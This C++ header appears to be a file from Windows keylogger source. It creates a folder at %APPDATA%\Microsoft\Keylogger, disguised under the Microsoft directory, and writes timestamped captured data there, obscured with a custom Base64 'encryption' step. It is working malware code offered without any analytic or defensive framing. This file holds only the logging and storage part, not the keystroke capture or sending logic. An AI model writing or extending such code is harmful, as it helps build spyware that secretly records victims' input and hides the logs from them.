#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
	std::string GetOurPath(const bool append_separarator = false)
	{
		std::string _appdata_dir(getenv("APPDATA"));
		std::string full = _appdata_dir + "\\Microsoft\\Keylogger";
		std::string path = full + (append_separarator ? "\\" : std::string());
		return path;
	}

	bool MkOneDr(std::string path)
	{
		bool returnValue = (bool)CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
		return returnValue;
	}

	bool MkDir(std::string path)
	{
		for (char &c : path)
			if (c == '\\')
			{
				c = '\0';
				if (!MkOneDr(path)) { return false;	}
				c = '\\';
			}
		return true;
	}

	template <class T>
	std::string WriteLog(const T &t)
	{
		std::string path = GetOurPath(true);
		Helper::DateTime dt;

		std::string name = "name.log"; //dt.GetDateTimeString("_") + ".log";
		try
		{
			std::ofstream file(path + name);
			if (!file) { return std::string(); }

			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
			std::string data = Base64::CustomEncrypt(s.str());
			file << data;

			if (!file) { return std::string(); }
			
			file.close();
			return name;
		}
		catch (...)
		{
			return std::string();
		}
	}
}
#endif 